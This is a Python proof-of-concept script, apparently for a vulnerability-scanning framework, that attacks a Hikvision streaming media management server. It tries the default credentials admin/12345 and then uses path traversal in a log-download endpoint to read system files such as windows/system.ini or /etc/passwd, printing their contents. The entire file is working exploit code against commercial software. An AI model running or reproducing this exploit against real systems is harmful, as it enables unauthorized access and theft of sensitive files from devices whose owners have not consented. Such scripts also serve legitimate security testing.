from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin
import requests
import time

POC_NAME = "HIKVISION_file_read"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class HIKVISION_file_read(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0043',    # PoC的VID编号
            'vbid': '',
            'Name': 'HIKVISION_file_read',    # PoC名称
            'Author': 'lUc1f3r11',    # PoC作者
            'Create_date': '2021-10-22',    # PoC创建时间
            },

        'vul': {
            'Product': '杭州海康威视系统技术有限公司流媒体管理服务器',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': '文件读取',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                杭州海康威视系统技术有限公司流媒体管理服务器存在弱口令漏洞，攻击者可利用该漏洞登录后台获取敏感信息。
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-09-22',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        url = urljoin(target,"/data/login.php")
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        data = "userName=YWRtaW4=&password=MTIzNDU="

        try:
            res_login = requests.post(url=url, data=data, headers=headers,verify=False, timeout=5)
            if "0" in res_login.text and res_login.status_code == 200:
                print("[----------------------------------------------]")
                print(f"[!] 目标系统: {url} 存在通用弱口令admin/1234533[0m ")
            else:
                print("[----------------------------------------------]")
                print(f"[!] 目标系统: {url} 不存在弱口令 ")
        except Exception as e:
            print("[----------------------------------------------]")
            print("[0] 目标系统出现意外情况！n", e)

        filename = "../../../../../../../../../../../../../../../windows/system.ini" # window
        #filename = "../../../../../../../../../../../../../../../etc/passwd" # linux
        url = urljoin(target, f"/systemLog/downFile.php?fileName={filename}")

        try:
            res = requests.get(url=url,headers=headers,verify=False, timeout=5)
            if res.status_code == 200 and "window.history.back(-1)" in res.text:
                print("[----------------------------------------------]")
                print(f"[0] 目标系统: {url} 不存在该文件{filename}")
            elif res.status_code == 200:
                print("[----------------------------------------------]")
                print(f"[!] 目标系统: {url} 存在任意文件读取！")
                print(f"[!] 正在读取文件:{filename} 中.......33[0m")
                time.sleep(1)
                print(f"[-] 文件内容为:n {res.text}")
            else:
                print("[----------------------------------------------]")
                print("[0] 目标系统连接失败！")

        except Exception as e:
            print("[----------------------------------------------]")
            print("[0]  目标系统出现意外情况！n",e)

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)